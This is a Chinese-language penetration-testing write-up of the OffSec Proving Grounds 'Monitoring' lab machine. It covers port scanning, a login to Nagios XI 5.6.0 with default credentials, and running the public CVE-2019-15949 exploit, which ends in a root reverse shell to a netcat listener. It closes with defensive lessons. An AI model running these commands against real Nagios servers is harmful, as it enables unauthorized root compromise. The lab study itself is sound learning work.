# Monitoring 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-06-29

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)
使用 RustScan 快速定位開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.157.136 -- -sV   

........

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       syn-ack ttl 61 Postfix smtpd
80/tcp   open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
389/tcp  open  ldap       syn-ack ttl 61 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/https  syn-ack ttl 61 Apache/2.4.18 (Ubuntu)
5667/tcp open  tcpwrapped syn-ack ttl 61
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | OpenSSH      | 遠端 SSH 管理服務。 |
| 25/tcp     | SMTP         | Postfix smtpd| 郵件傳輸服務。 |
| 80/tcp     | HTTP         | Apache httpd | 網頁服務，預設 Nagios XI 頁面，但會觸發 NSP 錯誤。 |
| 389/tcp    | LDAP         | OpenLDAP     | 目錄服務。 |
| 443/tcp    | HTTPS        | Apache httpd | 安全網頁服務，可用於正常登入 Nagios XI。 |
| 5667/tcp   | Nagios       | Nagios NSCA  | Nagios 監控代理服務端口。 |

---

### 🌐 網頁服務列舉 (Web Enumeration)

#### 1. Nagios XI HTTP / HTTPS 存取測試
*   **HTTP (80 埠) 存取**：
    訪問 `http://192.168.234.136/` 會跳轉至 Nagios XI 登入頁面，但在嘗試輸入任何憑證時，系統會彈出 NSP 安全報錯：`NSP: Sorry Dave, I can't let you do that`。

*   **HTTPS (443 埠) 存取**：
    為了繞過此錯誤，改用 HTTPS 存取：`https://192.168.234.136/`，此處可以順利送出登入憑證且不會觸發上述錯誤。

	![](image/Pasted%20image%2020260629221102.png)

	![](image/Pasted%20image%2020260629221725.png)

#### 2. 弱憑證嘗試 (Default Credentials)
嘗試常見與預設的 Nagios 管理員憑證：
*   **帳號**：`nagiosadmin`
*   **密碼**：`admin` (或 `password` 等)

	![](image/Pasted%20image%2020260629222146.png)

嘗試使用 `nagiosadmin:admin` 成功登入 Nagios XI 儀表板，並在頁面左下角發現系統版本為 **Nagios XI 5.6.0**。

![](image/Pasted%20image%2020260629223452.png)

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
舊版 `Nagios XI 5.6.0` 存在一個本地/遠端 Root 權限任意代碼執行漏洞（CVE-2019-15949）。

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit nagios xi
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
.........
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation                      | php/webapps/47299.php
Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)                              | multiple/webapps/52138.txt
.........
```

*   **漏洞原理**：
    1. Nagios XI 允許系統管理員在後台下載系統設定檔（觸發 `profile.php?cmd=download`）。
    2. 下載程序會以 `root` 權限執行定時備份與收集日誌指令碼 `/usr/local/nagiosxi/html/includes/components/profile/getprofile.sh`（這是透過免密碼的 `sudo` 權限所設定的）。
    3. `getprofile.sh` 在運作中會執行監控插件 `check_plugin`，但此插件檔案的擁有者為 `nagios` 使用者。
    4. 當攻擊者已擁有後台 Admin 權限，便可至管理介面中修改或上傳自訂的 `check_plugin`。只要在 `check_plugin` 中寫入惡意指令，再觸發系統下載 Profile，該惡意指令就會隨 `getprofile.sh` 以 `root` 權限被執行。

---

### 🔑 初始存取突破 (Exploitation & PrivEsc)

1. **取得 Exploit 腳本**：
   使用 `searchsploit` 下載 Nagios XI 5.6.6 RCE 漏洞利用腳本（CVE-2019-15949）並重命名為 `52138.py`：
	```bash
	┌──(kali㉿kali)-[~/Desktop/monitoring]
	└─$ searchsploit -m 52138
	  Exploit: Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)
	      URL: https://www.exploit-db.com/exploits/52138
	     Path: /usr/share/exploitdb/exploits/multiple/webapps/52138.txt
	    Codes: CVE-2019-15949
	 Verified: False
	File Type: Python script, Unicode text, UTF-8 text executable
	Copied to: /home/kali/Desktop/monitoring/52138.txt
	                                                                     
	┌──(kali㉿kali)-[~/Desktop/monitoring]
	└─$ mv 52138.txt 52138.py        
	                                                                                                                           
	┌──(kali㉿kali)-[~/Desktop/monitoring]
	└─$ python3 52138.py          
	usage: 52138.py [-h] -t <Target base URL> -b <Base Directory> -u <Username> -p <Password> -lh <Listener IP>
	                -lp <Listener Port> [-k]
	52138.py: error: the following arguments are required: -t, -b, -u, -p, -lh, -lp
	```

2. **啟動本機監聽**：
   在攻擊機 (Kali) 啟動 Netcat 監聽：
   ```bash
   rlwrap nc -lvnp 4444 
   ```

3. **執行 Exploit 取得 Root Shell**：
   執行腳本並傳入 HTTP 目標 URL、預設憑證以及本機監聽 IP 與 Port：
	```bash
	┌──(kali㉿kali)-[~/Desktop/monitoring]
	└─$ python3 52138.py -t http://192.168.157.136 -b /nagiosxi -u nagiosadmin -p admin -lh 192.168.45.186 -lp 4444 
	CVE-2019-15949 Nagiosxi authenticated Remote Code Execution
	Login NSP Token: 5f3fa15f8216eb62bb2e0a885a21f8baab63770d9db5f1c2c24abbc20d80bd6f
	Logged in!
	Uploading Malicious Check Ping Plugin
	Upload NSP Token: 237e666c865a28ecfcaef719391be99a47936577d968a302215d6b6e1afe661d
	```
   腳本會自動登入、上傳惡意 Payload 至 `check_plugin`，並自動觸發 Profile 下載。
   
   隨後在本機 Netcat 監聽端即可成功取得靶機的 Shell，直接以 `root` 權限登入系統：
	```bash
	┌──(kali㉿kali)-[~/Desktop/monitoring]
	└─$ rlwrap nc -lvnp 4444                            
	listening on [any] 4444 ...
	connect to [192.168.45.186] from (UNKNOWN) [192.168.157.136] 43448
	bash: cannot set terminal process group (954): Inappropriate ioctl for device
	bash: no job control in this shell
	root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# whoami
	whoami
	root
	```

3. 找到 `proof.txt`
	```bash
	root@ubuntu:/# find / -type f -name proof.txt 2>/dev/null
	find / -type f -name proof.txt 2>/dev/null
	/root/proof.txt
	```

---

## 💡 3. 心得與學習點 (Key Takeaways)

1. **為什麼這個漏洞會存在？**
   - **預設憑證未更改**：管理平台 Nagios XI 沿用了預設的管理員帳密 `nagiosadmin:admin`，直接導致後台失守。
   - **不安全的提權向量 (SUID / Sudo)**：以 root 運行的特權指令碼 (`getprofile.sh`) 直接呼叫了低權限使用者 (`nagios`) 可修改的檔案 (`check_plugin`)，形成典型的權限劫持。
2. **安全防禦建議：**
   - 首次部署 Nagios 後應立即更改預設的 `nagiosadmin` 密碼。
   - 將 Nagios XI 升級至 `5.6.6` 或更高版本。
   - 檢查系統內免密碼 `sudo` 執行的特權指令碼，確保其依賴的 any 二進位檔或外部腳本對一般使用者均為不可寫入 (Non-writable)。
